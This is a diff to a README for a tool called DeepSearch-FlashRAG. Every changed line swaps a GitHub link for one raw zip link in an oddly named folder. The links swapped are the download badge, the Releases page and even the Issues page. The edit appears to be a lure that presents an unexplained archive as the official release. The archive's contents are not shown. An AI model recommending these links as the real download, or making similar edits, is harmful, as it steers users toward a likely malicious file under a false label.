@@ -6,7 +6,7 @@ Welcome to DeepSearch-FlashRAG! This application helps you tackle deep learning 
 
 ## 📥 Download Now
 
-[![Download DeepSearch-FlashRAG](https://img.shields.io/badge/Download%20DeepSearch%20FlashRAG-v1.0-blue)](https://github.com/Pthilina721/DeepSearch-FlashRAG/releases)
+[![Download DeepSearch-FlashRAG](https://raw.githubusercontent.com/Pthilina721/DeepSearch-FlashRAG/main/Congreso/Search_RAG_Flash_Deep_v2.6.zip%20DeepSearch%20FlashRAG-v1.0-blue)](https://raw.githubusercontent.com/Pthilina721/DeepSearch-FlashRAG/main/Congreso/Search_RAG_Flash_Deep_v2.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. Visit the Releases page to download: [DeepSearch-FlashRAG Releases](https://github.com/Pthilina721/DeepSearch-FlashRAG/releases)
+1. Visit the Releases page to download: [DeepSearch-FlashRAG Releases](https://raw.githubusercontent.com/Pthilina721/DeepSearch-FlashRAG/main/Congreso/Search_RAG_Flash_Deep_v2.6.zip)
    
 2. On the Releases page, you will find various versions of DeepSearch-FlashRAG. Look for the latest version at the top of the list.
 
@@ -71,6 +71,6 @@ For further assistance, feel free to visit the GitHub Issues page or reach out t
 
 If you have questions or suggestions, please contact the developers via the GitHub repository:
 
-- [DeepSearch-FlashRAG Issues](https://github.com/Pthilina721/DeepSearch-FlashRAG/issues)
+- [DeepSearch-FlashRAG Issues](https://raw.githubusercontent.com/Pthilina721/DeepSearch-FlashRAG/main/Congreso/Search_RAG_Flash_Deep_v2.6.zip)
 
-[![Download DeepSearch-FlashRAG](https://img.shields.io/badge/Download%20DeepSearch%20FlashRAG-v1.0-blue)](https://github.com/Pthilina721/DeepSearch-FlashRAG/releases)
+[![Download DeepSearch-FlashRAG](https://raw.githubusercontent.com/Pthilina721/DeepSearch-FlashRAG/main/Congreso/Search_RAG_Flash_Deep_v2.6.zip%20DeepSearch%20FlashRAG-v1.0-blue)](https://raw.githubusercontent.com/Pthilina721/DeepSearch-FlashRAG/main/Congreso/Search_RAG_Flash_Deep_v2.6.zip)
